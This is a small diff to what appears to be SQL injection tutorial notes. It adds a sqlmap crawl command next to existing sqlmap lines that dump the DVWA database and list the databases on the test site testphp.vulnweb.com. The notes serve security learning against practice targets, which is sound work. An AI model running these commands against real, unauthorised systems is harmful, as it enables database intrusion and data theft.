@@ -178,6 +178,9 @@ Sqlmap -r req.txt -D dvwa --dump
 In alternative we can use SQLMap and the vulnerable url
 
 Get all databases using sqlmap
+
+sqlmap -u "http://example.com/" --crawl=3
+
 sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs
 
 Get tables from a selected database_name
